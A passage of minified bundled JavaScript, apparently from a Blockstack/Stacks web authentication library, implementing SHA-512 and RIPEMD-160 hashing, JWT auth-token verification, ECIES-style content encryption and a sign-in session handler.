              for (let r = 0; r < 16; r++) {
                const e = (st(n + at(h, i, s, l) + lt[p[r]] + t, y[r]) + u) | 0;
                (n = u), (u = l), (l = 0 | st(s, 10)), (s = i), (i = e);
              }
              for (let n = 0; n < 16; n++) {
                const t = (st(r + at(e, o, a, c) + lt[g[n]] + d, w[n]) + f) | 0;
                (r = f), (f = c), (c = 0 | st(a, 10)), (a = o), (o = t);
              }
            }
            this.set(
              (this.h1 + s + c) | 0,
              (this.h2 + l + f) | 0,
              (this.h3 + u + r) | 0,
              (this.h4 + n + o) | 0,
              (this.h0 + i + a) | 0
            );
          }
          roundClean() {
            lt.fill(0);
          }
          destroy() {
            (this.destroyed = !0), this.buffer.fill(0), this.set(0, 0, 0, 0, 0);
          }
        }
        const ut = C(() => new ct());
        const ft = BigInt(2 ** 32 - 1),
          ht = BigInt(32);
        function dt(e) {
          return arguments.length > 1 && void 0 !== arguments[1] && arguments[1]
            ? { h: Number(e & ft), l: Number((e >> ht) & ft) }
            : { h: 0 | Number((e >> ht) & ft), l: 0 | Number(e & ft) };
        }
        const pt = {
            fromBig: dt,
            split: function (e) {
              let t =
                  arguments.length > 1 &&
                  void 0 !== arguments[1] &&
                  arguments[1],
                n = new Uint32Array(e.length),
                r = new Uint32Array(e.length);
              for (let i = 0; i < e.length; i++) {
                const { h: o, l: s } = dt(e[i], t);
                [n[i], r[i]] = [o, s];
              }
              return [n, r];
            },
            toBig: (e, t) => (BigInt(e >>> 0) << ht) | BigInt(t >>> 0),
            shrSH: (e, t, n) => e >>> n,
            shrSL: (e, t, n) => (e << (32 - n)) | (t >>> n),
            rotrSH: (e, t, n) => (e >>> n) | (t << (32 - n)),
            rotrSL: (e, t, n) => (e << (32 - n)) | (t >>> n),
            rotrBH: (e, t, n) => (e << (64 - n)) | (t >>> (n - 32)),
            rotrBL: (e, t, n) => (e >>> (n - 32)) | (t << (64 - n)),
            rotr32H: (e, t) => t,
            rotr32L: (e, t) => e,
            rotlSH: (e, t, n) => (e << n) | (t >>> (32 - n)),
            rotlSL: (e, t, n) => (t << n) | (e >>> (32 - n)),
            rotlBH: (e, t, n) => (t << (n - 32)) | (e >>> (64 - n)),
            rotlBL: (e, t, n) => (e << (n - 32)) | (t >>> (64 - n)),
            add: function (e, t, n, r) {
              const i = (t >>> 0) + (r >>> 0);
              return { h: (e + n + ((i / 2 ** 32) | 0)) | 0, l: 0 | i };
            },
            add3L: (e, t, n) => (e >>> 0) + (t >>> 0) + (n >>> 0),
            add3H: (e, t, n, r) => (t + n + r + ((e / 2 ** 32) | 0)) | 0,
            add4L: (e, t, n, r) =>
              (e >>> 0) + (t >>> 0) + (n >>> 0) + (r >>> 0),
            add4H: (e, t, n, r, i) => (t + n + r + i + ((e / 2 ** 32) | 0)) | 0,
            add5H: (e, t, n, r, i, o) =>
              (t + n + r + i + o + ((e / 2 ** 32) | 0)) | 0,
            add5L: (e, t, n, r, i) =>
              (e >>> 0) + (t >>> 0) + (n >>> 0) + (r >>> 0) + (i >>> 0),
          },
          [gt, yt] = pt.split(
            [
              "0x428a2f98d728ae22",
              "0x7137449123ef65cd",
              "0xb5c0fbcfec4d3b2f",
              "0xe9b5dba58189dbbc",
              "0x3956c25bf348b538",
              "0x59f111f1b605d019",
              "0x923f82a4af194f9b",
              "0xab1c5ed5da6d8118",
              "0xd807aa98a3030242",
              "0x12835b0145706fbe",
              "0x243185be4ee4b28c",
              "0x550c7dc3d5ffb4e2",
              "0x72be5d74f27b896f",
              "0x80deb1fe3b1696b1",
              "0x9bdc06a725c71235",
              "0xc19bf174cf692694",
              "0xe49b69c19ef14ad2",
              "0xefbe4786384f25e3",
              "0x0fc19dc68b8cd5b5",
              "0x240ca1cc77ac9c65",
              "0x2de92c6f592b0275",
              "0x4a7484aa6ea6e483",
              "0x5cb0a9dcbd41fbd4",
              "0x76f988da831153b5",
              "0x983e5152ee66dfab",
              "0xa831c66d2db43210",
              "0xb00327c898fb213f",
              "0xbf597fc7beef0ee4",
              "0xc6e00bf33da88fc2",
              "0xd5a79147930aa725",
              "0x06ca6351e003826f",
              "0x142929670a0e6e70",
              "0x27b70a8546d22ffc",
              "0x2e1b21385c26c926",
              "0x4d2c6dfc5ac42aed",
              "0x53380d139d95b3df",
              "0x650a73548baf63de",
              "0x766a0abb3c77b2a8",
              "0x81c2c92e47edaee6",
              "0x92722c851482353b",
              "0xa2bfe8a14cf10364",
              "0xa81a664bbc423001",
              "0xc24b8b70d0f89791",
              "0xc76c51a30654be30",
              "0xd192e819d6ef5218",
              "0xd69906245565a910",
              "0xf40e35855771202a",
              "0x106aa07032bbd1b8",
              "0x19a4c116b8d2d0c8",
              "0x1e376c085141ab53",
              "0x2748774cdf8eeb99",
              "0x34b0bcb5e19b48a8",
              "0x391c0cb3c5c95a63",
              "0x4ed8aa4ae3418acb",
              "0x5b9cca4f7763e373",
              "0x682e6ff3d6b2b8a3",
              "0x748f82ee5defb2fc",
              "0x78a5636f43172f60",
              "0x84c87814a1f0ab72",
              "0x8cc702081a6439ec",
              "0x90befffa23631e28",
              "0xa4506cebde82bde9",
              "0xbef9a3f7b2c67915",
              "0xc67178f2e372532b",
              "0xca273eceea26619c",
              "0xd186b8c721c0c207",
              "0xeada7dd6cde0eb1e",
              "0xf57d4f7fee6ed178",
              "0x06f067aa72176fba",
              "0x0a637dc5a2c898a6",
              "0x113f9804bef90dae",
              "0x1b710b35131c471b",
              "0x28db77f523047d84",
              "0x32caab7b40c72493",
              "0x3c9ebe0a15c9bebc",
              "0x431d67c49c100d4c",
              "0x4cc5d4becb3e42b6",
              "0x597f299cfc657e2a",
              "0x5fcb6fab3ad6faec",
              "0x6c44198c4a475817",
            ].map((e) => BigInt(e))
          ),
          wt = new Uint32Array(80),
          mt = new Uint32Array(80);
        class bt extends B {
          constructor() {
            super(128, 64, 16, !1),
              (this.Ah = 1779033703),
              (this.Al = -205731576),
              (this.Bh = -1150833019),
              (this.Bl = -2067093701),
              (this.Ch = 1013904242),
              (this.Cl = -23791573),
              (this.Dh = -1521486534),
              (this.Dl = 1595750129),
              (this.Eh = 1359893119),
              (this.El = -1377402159),
              (this.Fh = -1694144372),
              (this.Fl = 725511199),
              (this.Gh = 528734635),
              (this.Gl = -79577749),
              (this.Hh = 1541459225),
              (this.Hl = 327033209);
          }
          get() {
            const {
              Ah: e,
              Al: t,
              Bh: n,
              Bl: r,
              Ch: i,
              Cl: o,
              Dh: s,
              Dl: a,
              Eh: l,
              El: c,
              Fh: u,
              Fl: f,
              Gh: h,
              Gl: d,
              Hh: p,
              Hl: g,
            } = this;
            return [e, t, n, r, i, o, s, a, l, c, u, f, h, d, p, g];
          }
          set(e, t, n, r, i, o, s, a, l, c, u, f, h, d, p, g) {
            (this.Ah = 0 | e),
              (this.Al = 0 | t),
              (this.Bh = 0 | n),
              (this.Bl = 0 | r),
              (this.Ch = 0 | i),
              (this.Cl = 0 | o),
              (this.Dh = 0 | s),
              (this.Dl = 0 | a),
              (this.Eh = 0 | l),
              (this.El = 0 | c),
              (this.Fh = 0 | u),
              (this.Fl = 0 | f),
              (this.Gh = 0 | h),
              (this.Gl = 0 | d),
              (this.Hh = 0 | p),
              (this.Hl = 0 | g);
          }
          process(e, t) {
            for (let m = 0; m < 16; m++, t += 4)
              (wt[m] = e.getUint32(t)), (mt[m] = e.getUint32((t += 4)));
            for (let m = 16; m < 80; m++) {
              const e = 0 | wt[m - 15],
                t = 0 | mt[m - 15],
                n = pt.rotrSH(e, t, 1) ^ pt.rotrSH(e, t, 8) ^ pt.shrSH(e, t, 7),
                r = pt.rotrSL(e, t, 1) ^ pt.rotrSL(e, t, 8) ^ pt.shrSL(e, t, 7),
                i = 0 | wt[m - 2],
                o = 0 | mt[m - 2],
                s =
                  pt.rotrSH(i, o, 19) ^ pt.rotrBH(i, o, 61) ^ pt.shrSH(i, o, 6),
                a =
                  pt.rotrSL(i, o, 19) ^ pt.rotrBL(i, o, 61) ^ pt.shrSL(i, o, 6),
                l = pt.add4L(r, a, mt[m - 7], mt[m - 16]),
                c = pt.add4H(l, n, s, wt[m - 7], wt[m - 16]);
              (wt[m] = 0 | c), (mt[m] = 0 | l);
            }
            let {
              Ah: n,
              Al: r,
              Bh: i,
              Bl: o,
              Ch: s,
              Cl: a,
              Dh: l,
              Dl: c,
              Eh: u,
              El: f,
              Fh: h,
              Fl: d,
              Gh: p,
              Gl: g,
              Hh: y,
              Hl: w,
            } = this;
            for (let m = 0; m < 80; m++) {
              const e =
                  pt.rotrSH(u, f, 14) ^
                  pt.rotrSH(u, f, 18) ^
                  pt.rotrBH(u, f, 41),
                t =
                  pt.rotrSL(u, f, 14) ^
                  pt.rotrSL(u, f, 18) ^
                  pt.rotrBL(u, f, 41),
                b = (u & h) ^ (~u & p),
                v = (f & d) ^ (~f & g),
                E = pt.add5L(w, t, v, yt[m], mt[m]),
                S = pt.add5H(E, y, e, b, gt[m], wt[m]),
                x = 0 | E,
                A =
                  pt.rotrSH(n, r, 28) ^
                  pt.rotrBH(n, r, 34) ^
                  pt.rotrBH(n, r, 39),
                k =
                  pt.rotrSL(n, r, 28) ^
                  pt.rotrBL(n, r, 34) ^
                  pt.rotrBL(n, r, 39),
                T = (n & i) ^ (n & s) ^ (i & s),
                C = (r & o) ^ (r & a) ^ (o & a);
              (y = 0 | p),
                (w = 0 | g),
                (p = 0 | h),
                (g = 0 | d),
                (h = 0 | u),
                (d = 0 | f),
                ({ h: u, l: f } = pt.add(0 | l, 0 | c, 0 | S, 0 | x)),
                (l = 0 | s),
                (c = 0 | a),
                (s = 0 | i),
                (a = 0 | o),
                (i = 0 | n),
                (o = 0 | r);
              const I = pt.add3L(x, k, C);
              (n = pt.add3H(I, S, A, T)), (r = 0 | I);
            }
            ({ h: n, l: r } = pt.add(0 | this.Ah, 0 | this.Al, 0 | n, 0 | r)),
              ({ h: i, l: o } = pt.add(0 | this.Bh, 0 | this.Bl, 0 | i, 0 | o)),
              ({ h: s, l: a } = pt.add(0 | this.Ch, 0 | this.Cl, 0 | s, 0 | a)),
              ({ h: l, l: c } = pt.add(0 | this.Dh, 0 | this.Dl, 0 | l, 0 | c)),
              ({ h: u, l: f } = pt.add(0 | this.Eh, 0 | this.El, 0 | u, 0 | f)),
              ({ h: h, l: d } = pt.add(0 | this.Fh, 0 | this.Fl, 0 | h, 0 | d)),
              ({ h: p, l: g } = pt.add(0 | this.Gh, 0 | this.Gl, 0 | p, 0 | g)),
              ({ h: y, l: w } = pt.add(0 | this.Hh, 0 | this.Hl, 0 | y, 0 | w)),
              this.set(n, r, i, o, s, a, l, c, u, f, h, d, p, g, y, w);
          }
          roundClean() {
            wt.fill(0), mt.fill(0);
          }
          destroy() {
            this.buffer.fill(0),
              this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
          }
        }
        class vt extends bt {
          constructor() {
            super(),
              (this.Ah = -1942145080),
              (this.Al = 424955298),
              (this.Bh = 1944164710),
              (this.Bl = -1982016298),
              (this.Ch = 502970286),
              (this.Cl = 855612546),
              (this.Dh = 1738396948),
              (this.Dl = 1479516111),
              (this.Eh = 258812777),
              (this.El = 2077511080),
              (this.Fh = 2011393907),
              (this.Fl = 79989058),
              (this.Gh = 1067287976),
              (this.Gl = 1780299464),
              (this.Hh = 286451373),
              (this.Hl = -1848208735),
              (this.outputLen = 28);
          }
        }
        class Et extends bt {
          constructor() {
            super(),
              (this.Ah = 573645204),
              (this.Al = -64227540),
              (this.Bh = -1621794909),
              (this.Bl = -934517566),
              (this.Ch = 596883563),
              (this.Cl = 1867755857),
              (this.Dh = -1774684391),
              (this.Dl = 1497426621),
              (this.Eh = -1775747358),
              (this.El = -1467023389),
              (this.Fh = -1101128155),
              (this.Fl = 1401305490),
              (this.Gh = 721525244),
              (this.Gl = 746961066),
              (this.Hh = 246885852),
              (this.Hl = -2117784414),
              (this.outputLen = 32);
          }
        }
        class St extends bt {
          constructor() {
            super(),
              (this.Ah = -876896931),
              (this.Al = -1056596264),
              (this.Bh = 1654270250),
              (this.Bl = 914150663),
              (this.Ch = -1856437926),
              (this.Cl = 812702999),
              (this.Dh = 355462360),
              (this.Dl = -150054599),
              (this.Eh = 1731405415),
              (this.El = -4191439),
              (this.Fh = -1900787065),
              (this.Fl = 1750603025),
              (this.Gh = -619958771),
              (this.Gl = 1694076839),
              (this.Hh = 1203062813),
              (this.Hl = -1090891868),
              (this.outputLen = 48);
          }
        }
        const xt = C(() => new bt());
        C(() => new vt()), C(() => new Et()), C(() => new St());
        function At(e) {
          return $(e);
        }
        function kt(e) {
          return xt(e);
        }
        const Tt = 0;
        function Ct(e, t) {
          return (function (e) {
            const t = $($(e));
            return Ye().encode((0, Ve.eV)(e, t).slice(0, e.length + 4));
          })((0, Ve.eV)(new Uint8Array([e]), t.slice(0, 20)));
        }
        function It(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : Tt;
          const n = "string" === typeof e ? (0, Ve.nr)(e) : e;
          var r;
          return Ct(t, ((r = At(n)), ut(r)));
        }
        function Ot(e) {
          const t = (0, qe.z)(e);
          return (0, Ve.ci)(Re(t.slice(0, 32), !0));
        }
        function Bt(e) {
          if (e) {
            const t = (function (e) {
              const t = e.split(":");
              if (3 !== t.length)
                throw new a("Decentralized IDs must have 3 parts");
              if ("did" !== t[0].toLowerCase())
                throw new a('Decentralized IDs must start with "did"');
              return t[1].toLowerCase();
            })(e);
            return "btc-addr" === t ? e.split(":")[2] : void 0;
          }
        }
        function Pt(e) {
          const t = (0, m.decodeToken)(e).payload;
          if ("string" === typeof t)
            throw new Error("Unexpected token payload type of string");
          const n = t.public_keys;
          if (1 !== n.length)
            throw new Error("Multiple public keys are not supported");
          {
            const t = n[0];
            try {
              return new m.TokenVerifier("ES256k", t).verify(e);
            } catch (r) {
              return !1;
            }
          }
        }
        function _t(e) {
          const t = (0, m.decodeToken)(e).payload;
          if ("string" === typeof t)
            throw new Error("Unexpected token payload type of string");
          const n = t.public_keys,
            r = Bt(t.iss);
          if (1 !== n.length)
            throw new Error("Multiple public keys are not supported");
          if (It(n[0]) === r) return !0;
          return !1;
        }
        function Ut(e) {
          const t = (0, m.decodeToken)(e).payload;
          if ("string" === typeof t)
            throw new Error("Unexpected token payload type of string");
          if (t.iat) {
            if ("number" !== typeof t.iat) return !1;
            const e = new Date(1e3 * t.iat);
            return !(new Date().getTime() < e.getTime());
          }
          return !0;
        }
        function Nt(e) {
          const t = (0, m.decodeToken)(e).payload;
          if ("string" === typeof t)
            throw new Error("Unexpected token payload type of string");
          if (t.exp) {
            if ("number" !== typeof t.exp) return !1;
            const e = new Date(1e3 * t.exp);
            return !(new Date().getTime() > e.getTime());
          }
          return !0;
        }
        We.hmacSha256Sync = function (e) {
          const t = O.create($, e);
          for (
            var n = arguments.length, r = new Array(n > 1 ? n - 1 : 0), i = 1;
            i < n;
            i++
          )
            r[i - 1] = arguments[i];
          return r.forEach((e) => t.update(e)), t.digest();
        };
        var Rt = n(2009);
        const Lt =
          'Crypto lib not found. Either the WebCrypto "crypto.subtle" or Node.js "crypto" module must be available.';
        async function $t() {
          if (
            "undefined" !== typeof crypto &&
            "undefined" !== typeof crypto.subtle
          )
            return { lib: crypto.subtle, name: "subtleCrypto" };
          try {
            return { lib: n(8859), name: "nodeCrypto" };
          } catch (e) {
            throw new Error(Lt);
          }
        }
        class Ht {
          constructor(e, t) {
            (this.createCipher = e), (this.createDecipher = t);
          }
          async encrypt(e, t, n, r) {
            if ("aes-128-cbc" !== e && "aes-256-cbc" !== e)
              throw new Error(`Unsupported cipher algorithm "${e}"`);
            const i = this.createCipher(e, t, n),
              o = new Uint8Array((0, Ve.eV)(i.update(r), i.final()));
            return Promise.resolve(o);
          }
          async decrypt(e, t, n, r) {
            if ("aes-128-cbc" !== e && "aes-256-cbc" !== e)
              throw new Error(`Unsupported cipher algorithm "${e}"`);
            const i = this.createDecipher(e, t, n),
              o = new Uint8Array((0, Ve.eV)(i.update(r), i.final()));
            return Promise.resolve(o);
          }
        }
        class Dt {
          constructor(e) {
            this.subtleCrypto = e;
          }
          async encrypt(e, t, n, r) {
            let i, o;
            if ("aes-128-cbc" === e) (i = "AES-CBC"), (o = 128);
            else {
              if ("aes-256-cbc" !== e)
                throw new Error(`Unsupported cipher algorithm "${e}"`);
              (i = "AES-CBC"), (o = 256);
            }
            const s = await this.subtleCrypto.importKey(
                "raw",
                t,
                { name: i, length: o },
                !1,
                ["encrypt"]
              ),
              a = await this.subtleCrypto.encrypt({ name: i, iv: n }, s, r);
            return new Uint8Array(a);
          }
          async decrypt(e, t, n, r) {
            let i, o;
            if ("aes-128-cbc" === e) (i = "AES-CBC"), (o = 128);
            else {
              if ("aes-256-cbc" !== e)
                throw new Error(`Unsupported cipher algorithm "${e}"`);
              (i = "AES-CBC"), (o = 256);
            }
            const s = await this.subtleCrypto.importKey(
                "raw",
                t,
                { name: i, length: o },
                !1,
                ["decrypt"]
              ),
              a = await this.subtleCrypto.decrypt({ name: i, iv: n }, s, r);
            return new Uint8Array(a);
          }
        }
        async function Mt() {
          const e = await $t();
          return "subtleCrypto" === e.name
            ? new Dt(e.lib)
            : new Ht(e.lib.createCipheriv, e.lib.createDecipheriv);
        }
        var Ft;
        function jt(e, t) {
          return O($, e, t);
        }
        function zt(e) {
          const t = kt(e);
          return { encryptionKey: t.slice(0, 32), hmacKey: t.slice(32) };
        }
        async function Kt(e, t, n, r) {
          const i = (function (e) {
            const t = {
                result: !1,
                reason_data: "Invalid public key format",
                reason: Ft.InvalidFormat,
              },
              n = {
                result: !1,
                reason_data: "Public key is not a point",
                reason: Ft.IsNotPoint,
              };
            if (66 !== e.length && 130 !== e.length) return t;
            const r = e.slice(0, 2);
            if (130 === e.length && "04" !== r) return t;
            if (66 === e.length && "02" !== r && "03" !== r) return t;
            if (null === e.match(/^[0-9a-f]+$/i)) return t;
            try {
              return (
                se.fromHex(e).assertValidity(),
                { result: !0, reason_data: null, reason: null }
              );
            } catch (i) {
              return n;
            }
          })(e);
          if (!i.result) throw i;
          const o = We.randomPrivateKey(),
            s = Re(o, !0);
          let a = $e(o, e, !0);
          a = a.slice(1);
          const l = zt(a),
            c = We.randomBytes(16),
            u = await (async function (e, t, n) {
              const r = await Mt();
              return await r.encrypt("aes-256-cbc", t, e, n);
            })(c, l.encryptionKey, t),
            f = (0, Ve.eV)(c, s, u),
            h = jt(l.hmacKey, f);
          let d;
          if (r && "hex" !== r) {
            if ("base64" !== r)
              throw new Error(`Unexpected cipherTextEncoding "${r}"`);
            d = (0, Rt.fromByteArray)(u);
          } else d = (0, Ve.ci)(u);
          const p = {
            iv: (0, Ve.ci)(c),
            ephemeralPK: (0, Ve.ci)(s),
            cipherText: d,
            mac: (0, Ve.ci)(h),
            wasString: n,
          };
          return r && "hex" !== r && (p.cipherTextEncoding = r), p;
        }
        async function Wt(e, t) {
          if (!t.ephemeralPK)
            throw new c(
              "Unable to get public key from cipher object. You might be trying to decrypt an unencrypted object."
            );
          const n = t.ephemeralPK;
          let r = $e(e, n, !0);
          r = r.slice(1);
          const i = zt(r),
            o = (0, Ve.nr)(t.iv);
          let s;
          if (t.cipherTextEncoding && "hex" !== t.cipherTextEncoding) {
            if ("base64" !== t.cipherTextEncoding)
              throw new Error(
                `Unexpected cipherTextEncoding "${t.cipherText}"`
              );
            s = (0, Rt.toByteArray)(t.cipherText);
          } else s = (0, Ve.nr)(t.cipherText);
          const a = (0, Ve.eV)(o, (0, Ve.nr)(n), s),
            l = jt(i.hmacKey, a);
          if (
            !(function (e, t) {
              if (e.length !== t.length) return !1;
              let n = 0;
              for (let r = 0; r < e.length; r++) n |= e[r] ^ t[r];
              return 0 === n;
            })((0, Ve.nr)(t.mac), l)
          )
            throw new c("Decryption failed: failure in MAC check");
          const u = await (async function (e, t, n) {
            const r = await Mt();
            return await r.decrypt("aes-256-cbc", t, e, n);
          })(o, i.encryptionKey, s);
          return t.wasString ? (0, Ve.Md)(u) : u;
        }
        function Vt(e, t) {
          const n = "string" === typeof t ? (0, Ve.iY)(t) : t,
            r = Ot(e),
            i = (function (e, t) {
              let n =
                arguments.length > 2 && void 0 !== arguments[2]
                  ? arguments[2]
                  : {};
              const { seed: r, m: i, d: o } = Fe(e, t, n.extraEntropy),
                s = new Ie(Z, Y);
              let a;
              for (
                s.reseedSync(r);
                !(a = Pe(s.generateSync(), i, o, n.canonical));

              )
                s.reseedSync();
              return je(a, n);
            })(At(n), e);
          return { signature: (0, Ve.ci)(i), publicKey: r };
        }
        (We.hmacSha256Sync = function (e) {
          const t = O.create($, e);
          for (
            var n = arguments.length, r = new Array(n > 1 ? n - 1 : 0), i = 1;
            i < n;
            i++
          )
            r[i - 1] = arguments[i];
          return r.forEach((e) => t.update(e)), t.digest();
        }),
          (function (e) {
            (e.InvalidFormat = "InvalidFormat"), (e.IsNotPoint = "IsNotPoint");
          })(Ft || (Ft = {}));
        const qt = "1.4.0";
        function Gt() {
          return (0, Ve.ci)(We.randomPrivateKey());
        }
        function Yt(e, t, n) {
          let r =
              arguments.length > 3 && void 0 !== arguments[3]
                ? arguments[3]
                : p.f3.slice(),
            i = arguments.length > 4 ? arguments[4] : void 0,
            o =
              arguments.length > 5 && void 0 !== arguments[5]
                ? arguments[5]
                : (0, Ve.nD)().getTime(),
            s =
              arguments.length > 6 && void 0 !== arguments[6]
                ? arguments[6]
                : {};
          const a = (e) => {
            const t = (0, Ve.Rf)("location", {
              throwIfUnavailable: !0,
              usageDesc: `makeAuthRequest([${e}=undefined])`,
            });
            return null === t || void 0 === t ? void 0 : t.origin;
          };
          t || (t = `${a("redirectURI")}/`),
            n || (n = `${a("manifestURI")}/manifest.json`),
            i || (i = a("appDomain"));
          const l = Object.assign({}, s, {
              jti: (0, Ve.gS)(),
              iat: Math.floor(new Date().getTime() / 1e3),
              exp: Math.floor(o / 1e3),
              iss: null,
              public_keys: [],
              domain_name: i,
              manifest_uri: n,
              redirect_uri: t,
              version: qt,
              do_not_include_profile: !0,
              supports_hub_url: !0,
              scopes: r,
            }),
            c = m.SECP256K1Client.derivePublicKey(e);
          l.public_keys = [c];
          const u = It(c);
          l.iss = (function (e) {
            return `did:btc-addr:${e}`;
          })(u);
          return new m.TokenSigner("ES256k", e).sign(l);
        }
        async function Zt(e, t) {
          const n = (0, Ve.Md)((0, Ve.nr)(t)),
            r = JSON.parse(n),
            i = await Wt(e, r);
          if ("string" !== typeof i)
            throw new Error("Unable to correctly decrypt private key");
          return i;
        }
        var Jt = n(6435),
          Xt = n(8261),
          Qt = n(718);
        function en(e) {
          let t,
            n =
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : null;
          t = n
            ? (function (e, t) {
                const n = (0, m.decodeToken)(e),
                  r = n.payload;
                if ("string" === typeof r)
                  throw new Error("Unexpected token payload type of string");
                if (!r.hasOwnProperty("subject") || !r.subject)
                  throw new Error("Token doesn't have a subject");
                if (!r.subject.hasOwnProperty("publicKey"))
                  throw new Error("Token doesn't have a subject public key");
                if (!r.hasOwnProperty("issuer") || !r.issuer)
                  throw new Error("Token doesn't have an issuer");
                if (!r.issuer.hasOwnProperty("publicKey"))
                  throw new Error("Token doesn't have an issuer public key");
                if (!r.hasOwnProperty("claim"))
                  throw new Error("Token doesn't have a claim");
                const i = r.issuer.publicKey,
                  o = (0, Qt.EJ)(i);
                if (t === i);
                else if (t !== o)
                  throw new Error(
                    "Token issuer public key does not match the verifying value"
                  );
                const s = new m.TokenVerifier(n.header.alg, i);
                if (!s) throw new Error("Invalid token verifier");
                if (!s.verify(e)) throw new Error("Token verification failed");
                return n;
              })(e, n)
            : (0, m.decodeToken)(e);
          let r = {};
          if (t.hasOwnProperty("payload")) {
            const e = t.payload;
            if ("string" === typeof e)
              throw new Error("Unexpected token payload type of string");
            e.hasOwnProperty("claim") && (r = e.claim);
          }
          return r;
        }
        var tn = n(4135),
          nn = n(9926);
        const rn = "_blockstackDidCheckEchoReply";
        function on() {
          let e;
          if ("undefined" !== typeof self) e = self;
          else {
            if ("undefined" === typeof window) return !1;
            e = window;
          }
          if (!e.location || !e.localStorage) return !1;
          const t = e[rn];
          if ("boolean" === typeof t) return t;
          const n = (r = e.location.search)
            ? (/^[?#]/.test(r) ? r.slice(1) : r).split("&").reduce((e, t) => {
                const [n, r] = t.split("=");
                return (
                  (e[n] = r ? decodeURIComponent(r.replace(/\+/g, " ")) : ""), e
                );
              }, {})
            : {};
          var r;
          const i = n.echoReply;
          if (i) {
            e[rn] = !0;
            const t = `echo-reply-${i}`;
            return (
              e.localStorage.setItem(t, "success"),
              e.setTimeout(() => {
                const t = n.authContinuation;
                e.location.href = t;
              }, 10),
              !0
            );
          }
          return !1;
        }
        class sn {
          constructor(e) {
            let t = !0;
            if (
              ("undefined" === typeof window &&
                "undefined" === typeof self &&
                (t = !1),
              e && e.appConfig)
            )
              this.appConfig = e.appConfig;
            else {
              if (!t) throw new s("You need to specify options.appConfig");
              this.appConfig = new r.X();
            }
            e && e.sessionStore
              ? (this.store = e.sessionStore)
              : (this.store = t
                  ? e
                    ? new w(e.sessionOptions)
                    : new w()
                  : e
                  ? new y(e.sessionOptions)
                  : new y());
          }
          makeAuthRequestToken(e, t, n, r, i) {
            let o =
                arguments.length > 5 && void 0 !== arguments[5]
                  ? arguments[5]
                  : (0, Ve.cG)().getTime(),
              s =
                arguments.length > 6 && void 0 !== arguments[6]
                  ? arguments[6]
                  : {};
            const a = this.appConfig;
            if (!a) throw new u("Missing AppConfig");
            return Yt(
              (e = e || this.generateAndStoreTransitKey()),
              (t = t || a.redirectURI()),
              (n = n || a.manifestURI()),
              (r = r || a.scopes),
              (i = i || a.appDomain),
              o,
              s
            );
          }
          generateAndStoreTransitKey() {
            const e = this.store.getSessionData(),
              t = Gt();
            return (e.transitKey = t), this.store.setSessionData(e), t;
          }
          getAuthResponseToken() {
            var e, t;
            const n =
              null ===
                (e = (0, Ve.Rf)("location", {
                  throwIfUnavailable: !0,
                  usageDesc: "getAuthResponseToken",
                })) || void 0 === e
                ? void 0
                : e.search;
            return null !== (t = new URLSearchParams(n).get("authResponse")) &&
              void 0 !== t
              ? t
              : "";
          }
          isSignInPending() {
            try {
              if (on())
                return (
                  Jt.Y.info(
                    "protocolEchoReply detected from isSignInPending call, the page is about to redirect."
                  ),
                  !0
                );
            } catch (e) {
              Jt.Y.error(
                `Error checking for protocol echo reply isSignInPending: ${e}`
              );
            }
            return !!this.getAuthResponseToken();
          }
          isUserSignedIn() {
            return !!this.store.getSessionData().userData;
          }
          async handlePendingSignIn() {
            let e =
                arguments.length > 0 && void 0 !== arguments[0]
                  ? arguments[0]
                  : this.getAuthResponseToken(),
              t =
                arguments.length > 1 && void 0 !== arguments[1]
                  ? arguments[1]
                  : (0, tn.eA)();
            const n = this.store.getSessionData();
            if (n.userData) throw new l("Existing user session found.");
            const r = this.store.getSessionData().transitKey;
            let i = this.appConfig && this.appConfig.coreNode;
            if (!i) {
              i = new nn._Y().bnsLookupUrl;
            }
            const o = (0, m.decodeToken)(e).payload;
            if ("string" === typeof o)
              throw new Error("Unexpected token payload type of string");
            if (
              !(await (async function (e) {
                return (await Promise.all([Nt(e), Ut(e), Pt(e), _t(e)])).every(
                  (e) => e
                );
              })(e))
            )
              throw new l("Invalid authentication response.");
            let s = o.private_key,
              a = o.core_token;
            if ((0, Ve.se)(o.version, "1.1.0")) {
              if (void 0 === r || null == r)
                throw new l(
                  "Authenticating with protocol > 1.1.0 requires transit key, and none found."
                );
              if (void 0 !== o.private_key && null !== o.private_key)
                try {
                  s = await Zt(r, o.private_key);
                } catch (g) {
                  if (
                    (Jt.Y.warn(
                      "Failed decryption of appPrivateKey, will try to use as given"
                    ),
                    (c = o.private_key),
                    !We.isValidPrivateKey((0, qe.z)(c)))
                  )
                    throw new l(
                      "Failed decrypting appPrivateKey. Usually means that the transit key has changed during login."
                    );
                }
              if (void 0 !== a && null !== a)
                try {
                  a = await Zt(r, a);
                } catch (g) {
                  Jt.Y.info(
                    "Failed decryption of coreSessionToken, will try to use as given"
                  );
                }
            }
            var c;
            let u,
              f = Xt.sM;
            (0, Ve.se)(o.version, "1.2.0") &&
              null !== o.hubUrl &&
              void 0 !== o.hubUrl &&
              (f = o.hubUrl),
              (0, Ve.se)(o.version, "1.3.0") &&
                null !== o.associationToken &&
                void 0 !== o.associationToken &&
                (u = o.associationToken);
            const h = {
                profile: o.profile,
                email: o.email,
                decentralizedID: o.iss,
                identityAddress: Bt(o.iss),
                appPrivateKey: s,
                coreSessionToken: a,
                authResponseToken: e,
                hubUrl: f,
                appPrivateKeyFromWalletSalt: o.appPrivateKeyFromWalletSalt,
                coreNode: o.blockstackAPIUrl,
                gaiaAssociationToken: u,
              },
              d = o.profile_url;
            if (!h.profile && d) {
              const e = await t(d);
              if (e.ok) {
                const t = await e.text(),
                  n = JSON.parse(t);
                h.profile = en(n[0].token);
              } else h.profile = Object.assign({}, p.lB);
            } else h.profile = o.profile;
            return (n.userData = h), this.store.setSessionData(n), h;
          }
          loadUserData() {
            const e = this.store.getSessionData().userData;
            if (!e) throw new u("No user data found. Did the user sign in?");
            return e;
          }
          encryptContent(e, t) {
            const n = Object.assign({}, t);
            return (
              n.privateKey ||
                (n.privateKey = this.loadUserData().appPrivateKey),
              (async function (e, t) {
                const n = Object.assign({}, t);
                let r;
                if (!n.publicKey) {
                  if (!n.privateKey)
                    throw new Error(
                      "Either public key or private key must be supplied for encryption."
                    );
                  n.publicKey = Ot(n.privateKey);
                }
                const i =
                    "boolean" === typeof n.wasString
                      ? n.wasString
                      : "string" === typeof e,
                  o = "string" === typeof e ? (0, Ve.iY)(e) : e,
